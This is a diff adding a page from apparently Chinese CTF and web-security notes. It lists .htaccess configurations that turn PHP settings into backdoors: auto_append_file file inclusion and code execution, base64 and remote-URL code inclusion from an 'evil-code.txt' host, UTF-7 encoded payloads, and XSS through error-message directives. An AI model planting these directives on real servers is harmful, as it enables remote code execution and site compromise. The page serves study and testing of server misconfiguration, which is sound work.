@@ -1,0 +1,1626 @@
+
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="ja">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.0">
+    
+    
+      
+        <title>.htaccess构成的后门 - My Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.0284f74d.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.01803549.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.74668098.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700|Source+Code+Pro&display=fallback">
+        <style>body,input{font-family:"Noto Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#htaccess" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../.." title="My Docs" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">school</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              My Docs
+            </span>
+            <span class="md-header-nav__topic">
+              
+                .htaccess构成的后门
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../.." title="Welcome to MkDocs" class="md-tabs__link">
+        Welcome to MkDocs
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../MISC/" title="MISC" class="md-tabs__link">
+          MISC
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../SQL/" title="SQL" class="md-tabs__link">
+          SQL
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../XSS/" title="XSS" class="md-tabs__link">
+          XSS
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../audit/" title="Audit" class="md-tabs__link">
+          Audit
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../basic/ch0/" title="Basic" class="md-tabs__link">
+          Basic
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../" title="Upload" class="md-tabs__link md-tabs__link--active">
+          Upload
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../web/" title="Web" class="md-tabs__link">
+          Web
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../writeup/" title="Writeup" class="md-tabs__link">
+          Writeup
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../.." title="My Docs" class="md-nav__button md-logo">
+      
+        <i class="md-icon">school</i>
+      
+    </a>
+    My Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Welcome to MkDocs" class="md-nav__link">
+      Welcome to MkDocs
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      MISC
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        MISC
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/" title="一些常见的MISC姿势" class="md-nav__link">
+      一些常见的MISC姿势
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/JPEG/" title="JPEG格式的图片隐写" class="md-nav__link">
+      JPEG格式的图片隐写
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/ch0/" title="常见文件格式" class="md-nav__link">
+      常见文件格式
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/ch1/" title="USB流量分析" class="md-nav__link">
+      USB流量分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/ch2/" title="Ch2" class="md-nav__link">
+      Ch2
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/ch3/" title="python沙盒" class="md-nav__link">
+      python沙盒
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../MISC/ch4/" title="常用工具" class="md-nav__link">
+      常用工具
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      SQL
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        SQL
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../SQL/" title="SQL注入" class="md-nav__link">
+      SQL注入
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../SQL/blindSQL/" title="blindSQL" class="md-nav__link">
+      blindSQL
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../SQL/ch0/" title="sql注入姿势积累" class="md-nav__link">
+      sql注入姿势积累
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../SQL/ch1/" title="SQL姿势" class="md-nav__link">
+      SQL姿势
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      XSS
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        XSS
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../XSS/" title="XSS" class="md-nav__link">
+      XSS
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      Audit
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Audit
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/" title="代码审计" class="md-nav__link">
+      代码审计
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/audit0/" title="审计小知识" class="md-nav__link">
+      审计小知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/audit1/" title="文件包含常见姿势" class="md-nav__link">
+      文件包含常见姿势
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/audit2/" title="Audit2" class="md-nav__link">
+      Audit2
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/audit3/" title="php反射" class="md-nav__link">
+      php反射
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/audit4/" title="PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患" class="md-nav__link">
+      PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/audit5/" title="利用`phar`扩展PHP反序列化漏洞攻击面" class="md-nav__link">
+      利用`phar`扩展PHP反序列化漏洞攻击面
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/audit6/" title="审计小知识" class="md-nav__link">
+      审计小知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/audit7/" title="审计小知识" class="md-nav__link">
+      审计小知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/code-breaking/" title="code-breaking" class="md-nav__link">
+      code-breaking
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/easyphp/" title="Easyphp" class="md-nav__link">
+      Easyphp
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/example/" title="example" class="md-nav__link">
+      example
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/function/" title="php常用函数" class="md-nav__link">
+      php常用函数
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/java/" title="从反序列化到命令执行 - Java 中的 POP 执行链" class="md-nav__link">
+      从反序列化到命令执行 - Java 中的 POP 执行链
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/javascript/" title="原型链污染攻击" class="md-nav__link">
+      原型链污染攻击
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/nodejs/" title="Nodejs" class="md-nav__link">
+      Nodejs
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/php-challenge/" title="记录php代码审计的小trick" class="md-nav__link">
+      记录php代码审计的小trick
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../audit/反序列化/" title="反序列化" class="md-nav__link">
+      反序列化
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      Basic
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        Basic
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../basic/ch0/" title="准备工作" class="md-nav__link">
+      准备工作
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7" checked>
+    
+    <label class="md-nav__link" for="nav-7">
+      Upload
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        Upload
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../" title="文件上传" class="md-nav__link">
+      文件上传
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../ch0/" title="PHP实现文件上传" class="md-nav__link">
+      PHP实现文件上传
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../ch1/" title=".user.ini构成的后门" class="md-nav__link">
+      .user.ini构成的后门
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        .htaccess构成的后门
+      </label>
+    
+    <a href="./" title=".htaccess构成的后门" class="md-nav__link md-nav__link--active">
+      .htaccess构成的后门
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="举例：" class="md-nav__link">
+    举例：
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-1a-file-inclusion" title="Example 1a: file inclusion" class="md-nav__link">
+    Example 1a: file inclusion
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-1b-php-code-execution" title="Example 1b: PHP code execution" class="md-nav__link">
+    Example 1b: PHP code execution
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-1c-directremote-file-inclusion" title="Example 1c: (direct/remote) file inclusion" class="md-nav__link">
+    Example 1c: (direct/remote) file inclusion
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-1d-xss-and-php-code-execution-with-utf-7" title="Example 1d: XSS and PHP code execution with UTF-7" class="md-nav__link">
+    Example 1d: XSS and PHP code execution with UTF-7
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-2a-xss-via-error-message-link" title="Example 2a: XSS via error message link" class="md-nav__link">
+    Example 2a: XSS via error message link
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-2b-xss-via-error-message-link-extension" title="Example 2b: XSS via error message link extension" class="md-nav__link">
+    Example 2b: XSS via error message link extension
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-3a-xss-via-phps-color" title="Example 3a: XSS via phps color" class="md-nav__link">
+    Example 3a: XSS via phps color
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-3b-xss-via-highlight_file-color" title="Example 3b: XSS via highlight_file() color" class="md-nav__link">
+    Example 3b: XSS via highlight_file() color
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-4a-failed-php-injection-via-error_log-and-include_path" title="Example 4a: failed PHP injection via error_log and include_path" class="md-nav__link">
+    Example 4a: failed PHP injection via error_log and include_path
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-4b-failed-php-injection-via-error_log-and-auto_prepend_file" title="Example 4b: failed PHP injection via error_log and auto_prepend_file" class="md-nav__link">
+    Example 4b: failed PHP injection via error_log and auto_prepend_file
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-4c-php-code-injection-via-error_log-and-utf-7" title="Example 4c: PHP code injection via error_log and UTF-7" class="md-nav__link">
+    Example 4c: PHP code injection via error_log and UTF-7
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-6-source-code-disclosure" title="Example 6: Source code disclosure" class="md-nav__link">
+    Example 6: Source code disclosure
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#stackoverflow" title="StackOverflow上一个问题：" class="md-nav__link">
+    StackOverflow上一个问题：
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#answer" title="answer:" class="md-nav__link">
+    answer:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="参考" class="md-nav__link">
+    参考
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8">
+    
+    <label class="md-nav__link" for="nav-8">
+      Web
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-8">
+        Web
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/" title="Web基础知识" class="md-nav__link">
+      Web基础知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/LFI/" title="本地文件包含" class="md-nav__link">
+      本地文件包含
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/blindXXE/" title="[Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)" class="md-nav__link">
+      [Exploiting XXE with local DTD files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../web/web0/" title="CRLF漏洞" class="md-nav__link">
+      CRLF漏洞
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
+    
+    <label class="md-nav__link" for="nav-9">
+      Writeup
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-9">
+        Writeup
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/" title="writeup" class="md-nav__link">
+      writeup
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/BUUCTF/" title="BUUCTF" class="md-nav__link">
+      BUUCTF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/Bypassing/" title="Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up" class="md-nav__link">
+      Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/Ogeek/" title="Ogeek" class="md-nav__link">
+      Ogeek
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/TokyoCTF/" title="东京CTF wp2018" class="md-nav__link">
+      东京CTF wp2018
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/bugku/" title="bugku" class="md-nav__link">
+      bugku
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/dianfengjike2018/" title="巅峰极客" class="md-nav__link">
+      巅峰极客
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/fivespace/" title="第五空间" class="md-nav__link">
+      第五空间
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/hackcon2019/" title="hackcon2019" class="md-nav__link">
+      hackcon2019
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../writeup/new-bugku/" title="newBugku" class="md-nav__link">
+      newBugku
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="举例：" class="md-nav__link">
+    举例：
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-1a-file-inclusion" title="Example 1a: file inclusion" class="md-nav__link">
+    Example 1a: file inclusion
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-1b-php-code-execution" title="Example 1b: PHP code execution" class="md-nav__link">
+    Example 1b: PHP code execution
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-1c-directremote-file-inclusion" title="Example 1c: (direct/remote) file inclusion" class="md-nav__link">
+    Example 1c: (direct/remote) file inclusion
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-1d-xss-and-php-code-execution-with-utf-7" title="Example 1d: XSS and PHP code execution with UTF-7" class="md-nav__link">
+    Example 1d: XSS and PHP code execution with UTF-7
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-2a-xss-via-error-message-link" title="Example 2a: XSS via error message link" class="md-nav__link">
+    Example 2a: XSS via error message link
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-2b-xss-via-error-message-link-extension" title="Example 2b: XSS via error message link extension" class="md-nav__link">
+    Example 2b: XSS via error message link extension
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-3a-xss-via-phps-color" title="Example 3a: XSS via phps color" class="md-nav__link">
+    Example 3a: XSS via phps color
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-3b-xss-via-highlight_file-color" title="Example 3b: XSS via highlight_file() color" class="md-nav__link">
+    Example 3b: XSS via highlight_file() color
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-4a-failed-php-injection-via-error_log-and-include_path" title="Example 4a: failed PHP injection via error_log and include_path" class="md-nav__link">
+    Example 4a: failed PHP injection via error_log and include_path
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-4b-failed-php-injection-via-error_log-and-auto_prepend_file" title="Example 4b: failed PHP injection via error_log and auto_prepend_file" class="md-nav__link">
+    Example 4b: failed PHP injection via error_log and auto_prepend_file
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-4c-php-code-injection-via-error_log-and-utf-7" title="Example 4c: PHP code injection via error_log and UTF-7" class="md-nav__link">
+    Example 4c: PHP code injection via error_log and UTF-7
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-6-source-code-disclosure" title="Example 6: Source code disclosure" class="md-nav__link">
+    Example 6: Source code disclosure
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#stackoverflow" title="StackOverflow上一个问题：" class="md-nav__link">
+    StackOverflow上一个问题：
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#answer" title="answer:" class="md-nav__link">
+    answer:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="参考" class="md-nav__link">
+    参考
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="htaccess">.htaccess构成的后门<a class="headerlink" href="#htaccess" title="Permanent link">&para;</a></h1>
+<h2 id="_1">举例：<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="example-1a-file-inclusion">Example 1a: file inclusion<a class="headerlink" href="#example-1a-file-inclusion" title="Permanent link">&para;</a></h2>
+<p>index.php: (empty)</p>
+<p>.htaccess:</p>
+<div class="codehilite"><pre><span></span>php_value auto_append_file /etc/hosts
+</pre></div>
+
+<h2 id="example-1b-php-code-execution">Example 1b: PHP code execution<a class="headerlink" href="#example-1b-php-code-execution" title="Permanent link">&para;</a></h2>
+<p>index.php: (empty)</p>
+<p>.htaccess:</p>
+<div class="codehilite"><pre><span></span>php_value auto_append_file .htaccess
+#&lt;?php phpinfo();
+</pre></div>
+
+<h2 id="example-1c-directremote-file-inclusion">Example 1c: (direct/remote) file inclusion<a class="headerlink" href="#example-1c-directremote-file-inclusion" title="Permanent link">&para;</a></h2>
+<p>index.php: (empty)</p>
+<p>.htaccess:</p>
+<div class="codehilite"><pre><span></span>php_flag allow_url_include 1
+php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
+#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
+#php_value auto_append_file https://sektioneins.de/evil-code.txt
+</pre></div>
+
+<h2 id="example-1d-xss-and-php-code-execution-with-utf-7">Example 1d: XSS and PHP code execution with UTF-7<a class="headerlink" href="#example-1d-xss-and-php-code-execution-with-utf-7" title="Permanent link">&para;</a></h2>
+<p>index.php: (empty)</p>
+<p>.htaccess:</p>
+<div class="codehilite"><pre><span></span>php_flag zend.multibyte 1
+php_value zend.script_encoding &quot;UTF-7&quot;
+php_value auto_append_file .htaccess
+#+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4 #+ADw?php phpinfo()+ADs
+</pre></div>
+
+<h2 id="example-2a-xss-via-error-message-link">Example 2a: XSS via error message link<a class="headerlink" href="#example-2a-xss-via-error-message-link" title="Permanent link">&para;</a></h2>
+<p>index.php: (produces error message)</p>
+<div class="codehilite"><pre><span></span>&lt;?php
+include(&#39;foo&#39;);
+</pre></div>
+
+<p>.htaccess:</p>
+<div class="codehilite"><pre><span></span>php_flag display_errors 1
+php_flag html_errors 1
+php_value docref_root &quot;&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;
+</pre></div>
+
+<h2 id="example-2b-xss-via-error-message-link-extension">Example 2b: XSS via error message link extension<a class="headerlink" href="#example-2b-xss-via-error-message-link-extension" title="Permanent link">&para;</a></h2>
+<p>index.php:</p>
+<div class="codehilite"><pre><span></span>&lt;?php
+include(&#39;foo&#39;);
+</pre></div>
+
+<p>.htaccess:</p>
+<div class="codehilite"><pre><span></span>php_flag display_errors 1
+php_flag html_errors 1
+php_value docref_root &quot;x&quot;
+php_value docref_ext &quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;
+</pre></div>
+
